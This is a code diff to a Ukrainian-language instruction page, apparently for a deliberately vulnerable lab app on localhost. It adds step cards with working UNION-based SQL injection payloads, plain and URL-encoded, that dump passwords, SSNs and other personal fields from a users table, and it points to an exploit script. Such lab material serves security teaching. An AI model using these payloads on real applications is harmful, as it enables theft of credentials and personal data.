@@ -476,13 +476,27 @@ Password: anything</pre>
             <h4><span class="step-number">2</span>UNION-based SQL Injection</h4>
             <p>Використайте endpoint <code>/account/&lt;id&gt;</code> для отримання даних інших користувачів:</p>
             <div class="code-block">
-                <pre>http://localhost:8080/account/1' UNION SELECT id,username,password,email,ssn,balance,role,1 FROM users--</pre>
+                <pre>/account/0 UNION SELECT id,username,password,email,account_number,balance,role,ssn,phone,address,created_at,last_login,is_active FROM users#</pre>
             </div>
             <p>Ця ін'єкція об'єднає результати запиту з даними таблиці users.</p>
+
+            <h5>URL-encoded версія для браузера:</h5>
+            <div class="code-block">
+                <pre>http://localhost:8080/account/0%20UNION%20SELECT%20id,username,password,email,account_number,balance,role,ssn,phone,address,created_at,last_login,is_active%20FROM%20users%23</pre>
+            </div>
         </div>
 
         <div class="step-card">
-            <h4><span class="step-number">3</span>Автоматизоване тестування</h4>
+            <h4><span class="step-number">3</span>Payload для витягування паролів</h4>
+            <p>Для отримання паролів в полі email (для зручності перегляду):</p>
+            <div class="code-block">
+                <pre>/account/0 UNION SELECT id,username,password,password,account_number,balance,role,ssn,phone,address,created_at,last_login,is_active FROM users#</pre>
+            </div>
+            <p>Цей payload виведе пароль двічі — в полях username та email.</p>
+        </div>
+
+        <div class="step-card">
+            <h4><span class="step-number">4</span>Автоматизоване тестування</h4>
             <p>Використайте готовий скрипт для тестування SQL ін'єкцій:</p>
             <div class="code-block">
                 <pre>python exploits/01_sql_injection.py</pre>
